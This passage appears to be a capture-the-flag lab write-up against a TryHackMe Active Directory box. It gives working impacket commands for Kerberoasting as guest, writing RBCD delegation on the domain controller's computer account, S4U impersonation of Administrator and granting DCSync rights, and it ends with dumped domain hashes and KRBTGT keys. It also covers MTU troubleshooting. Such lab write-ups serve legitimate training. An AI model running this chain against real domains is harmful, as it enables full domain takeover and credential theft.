## Phase 5 — Kerberoast as guest (Step 07) — the MTU battle

```bash
impacket-GetUserSPNs thm.local/guest -no-pass -request -dc-ip 10.65.178.132
```

The LDAP half worked (SPN table printed), then every TGS request died with `Connection reset by peer`. Diagnosis ladder:

1. ✗ 5 plain retries → all RST.
2. ✗ Lowered `tun0` MTU 1380→1300 → still RST.
3. ✓ `impacket-getTGT -no-pass thm.local/guest` → **TGT obtained** (`guest.ccache`), so AS-REQs work. Clock verified in sync via rootDSE `currentTime`.
4. ✗ MIT krb5 tools (`klist`/`kvno`) for a different stack → not installed.
5. ✗ `getST -spn HOST/AD.thm.local` → also RST → **all** TGS requests die, not just CODY_ROY's.
6. ✓ Raw TCP probe on port 88 with a small framed payload → KDC replied → TCP:88 itself is fine.
7. ✓ Payload-size probe: 200 B ✓, 700 B ✓, **1400 B → timeout** → size-dependent failure.
8. ✓ DF-set ping sweep: 1200 B passes, 1250 B+ fails → **true path MTU ≈ 1230 while tun0 negotiated 1300**, so full-MSS segments were black-holed. Small AS-REQs passed; TGS-REQs (which carry the TGT) filled a full segment and died.

```bash
echo kali | sudo -S ip link set dev tun0 mtu 1200
impacket-GetUserSPNs thm.local/guest -no-pass -request -dc-ip 10.65.178.132
# → $krb5tgs$23$*CODY_ROY$THM.LOCAL$...
```

**Hash captured.** (Lesson recorded: re-apply `mtu 1200` after any VPN reconnect before touching Kerberos.)

## Phase 7 — RBCD via guest's GenericWrite on `AD$` (Step 10b)

```bash
export KRB5CCNAME=/home/kali/guest.ccache
impacket-rbcd -delegate-to 'AD$' -delegate-from CODY_ROY -action write -k -no-pass thm.local/guest -dc-ip 10.65.178.132
# → CODY_ROY can now impersonate users on AD$ via S4U2Proxy
```

**Failures here.**
- ✗ NTLM form (`-no-pass` without Kerberos) → `NTLM needs domain\username and a password` — impacket rejects the empty password on this path. Fixed by authenticating over Kerberos with the guest TGT ccache.
- ✗ `-delegate-to AD` → `User not found in LDAP` — the computer account is `AD$`, dollar sign required.

## Phase 8 — S4U impersonation → DCSync grant (Steps 11 → 16 prep)

```bash
impacket-getST -spn ldap/AD.thm.local -impersonate Administrator 'thm.local/CODY_ROY:REDACTED' -dc-ip 10.65.178.132
# → Administrator@ldap_AD.thm.local@THM.LOCAL.ccache
```

Targeting `ldap/` (not `cifs/`) deliberately — the next tool needs LDAP, and DCSync rides LDAP.

Granting the ACE hit three walls in a row:

- ✗ `bloodyAD` → not installed on the box (the writeup's first-choice tool).
- ✗ `impacket-dacledit -rights DCSYNC` → argparse is case-sensitive; must be `DCSync`.
- ✗ `-dc-ip 10.65.178.132` → `KDC_ERR_PREAUTH_FAILED`: with `-dc-ip`, impacket hunts for a ticket to `ldap/10.65.178.132`, finds none (ours is `ldap/AD.thm.local`), and falls back to a passwordless TGT. Confirmed the ccache was good via python (principal `Administrator@thm.local`, server `ldap/AD.thm.local`), then:

```bash
export KRB5_CONFIG=/tmp/krb5.conf
impacket-dacledit -action write -rights DCSync -principal CODY_ROY -target-dn 'DC=thm,DC=local' \
  -k -no-pass -dc-host AD.thm.local thm.local/Administrator
# → DACL modified successfully (backup: dacledit-20260819-135642.bak)
```

## Failure ledger (root causes)

| Failure | Root cause | Fix |
|---|---|---|
| Kali unreachable | VM powered off | you booted it |
| NetBIOS timeouts (RID-brute) | 250 ms RTT vs chatty protocol | anonymous LDAP instead |
| hashcat dead on Kali | no OpenCL runtime in VM | john (CPU) |
| 0/5 AS-REP cracked | passwords not in rockyou | abandoned path (room's intent was kerberoast) |
| TGS requests RST | tun0 MTU 1300 > real path MTU ~1230; full-MSS segments black-holed | `ip link set tun0 mtu 1200` |
| rbcd NTLM refused | impacket rejects empty NTLM password | `-k` + guest TGT ccache |
| delegate-to AD not found | computer account is `AD$` | quote the `$` |
| bloodyAD missing | not installed | impacket-dacledit `-rights DCSync` |
| dacledit PREAUTH_FAILED | `-dc-ip` makes it seek `ldap/<IP>` ticket | `-dc-host AD.thm.local` matching the S4U ticket |

**Persistence/leftover state on the DC:** the RBCD entry on `AD$` (reversible via `rbcd.py -action remove`) and CODY_ROY's DCSync ACEs (reversible from `dacledit-20260819-135642.bak`). Loot lives in `/tmp/ntds.txt`, `/tmp/kerb.txt`, `/tmp/users.txt`, and the two ccaches in `/home/kali` on the Kali box. Single forest, no trusts — stop condition met with Administrator, KRBTGT, and the machine account keys in hand.
